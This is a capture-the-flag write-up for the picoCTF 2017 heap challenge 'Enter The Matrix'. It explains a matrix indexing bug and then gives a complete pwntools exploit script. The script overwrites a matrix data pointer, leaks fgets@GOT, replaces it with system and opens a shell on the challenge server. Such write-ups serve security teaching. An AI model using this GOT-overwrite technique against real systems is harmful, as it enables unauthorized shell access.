# Enter The Matrix
#### Writeup by hgarrereyn
* **Binary Exploitation**
* *150 points*
* Description: The Matrix awaits you. Take the red pill and begin your journey. Source. Jack in at shell2017.picoctf.com:9417.

# Overview

This program allows you to create matricies of various sizes which are stored on the heap. You can then set/get the value at specific indecies.

# Solution

Here is the struct for each matrix:

```c
struct matrix {
    int nrows, ncols;
    float *data;
};
```

When each matrix is initialized, memory is allocated like this:

```c
struct matrix *m = malloc(sizeof(struct matrix));
m->nrows = nrows;
m->ncols = ncols;
m->data = calloc(nrows * ncols, sizeof(float));
```

Here we see that the `data` field is allocated to exactly the right size to hold data. The issue is when the program tries to traverse this space. Here is how indexing was done:

```c
m->data[r * m->nrows + c] = v;
```
The fix would be to do it like this:
```c
m->data[r * m->ncols + c] = v;
```

It looks like the programmer was attempting to store rows in memory like this:

Given:
$$
M = \begin{bmatrix}
    a & b \\
	c & d \\
	e & f
\end{bmatrix}
$$

Store it as:

```
[a] <-- *data
[b]
[c]
[d]
[e]
[f] <-- end of data allocation
```

Where each element takes up 4 bytes (as a float).

However, due to the indexing bug, this matrix would be stored as such:

```
[a] <-- *data
[b]
<x>
[c]
[d]
<x> <-- end of data allocation
[e]
[f]
```

So this bug means we can write outside of our assigned heap space. My approach was to overflow into another matrix struct and use it to overwrite a GOT address with `system`.

When we create two matrices on the heap, they are allocated like this:

![mat1]()

And due to the indexing bug, we end up writing to the following memory locations:

![mat2]()

Notice how if we write to `3,0` we overwrite the `data` pointer of matrix 2. We can set this to point to the GOT table and perform our attack.

The only catch is that the program reads and writes *float values*. So we just have to do a little bit of encoding between hex addresses and floats.

# Script

```python
# By Harrison Green <hgarrereyn>

from pwn import *
import struct

# Connect
sock = remote('shell2017.picoctf.com', 9417)

# address offset in libc from fgets -> system
offset = -151264

# get next command
def n():
	return sock.recvuntil('Enter command:')

n()

sock.send('create 4 2\n')
n()

sock.send('create 1 1\n')
n()

# Sets mat 2 to point to the address of fgets@GOT
sock.send('set 0 3 0 3.991163316186605e-34\n')
n()

# Read fgets address
sock.send('get 1 0 0\n')

# Float -> hex conversion
f = float(n().replace('\n',' ').split(' ')[3])
print('Float val:\t' + repr(f))

fa = struct.unpack('<I', struct.pack('<f', f))[0]
print('Addr:\t' + hex(fa))

# Calculate system address
sa = fa + offset
print('Sys Addr:\t' + hex(sa))

# Hex -> float conversion
s = struct.unpack('>f',bytes(bytearray.fromhex(hex(sa)[2:])))[0]
print('Sys float:\t' + repr(s))

# Overwrite fgets@GOT with system
sock.send('set 1 0 0 ' + repr(s) + ' ; sh\n')
n()

# Call system('sh')
sock.send('sh\n')

# We've got shell
sock.interactive()
```
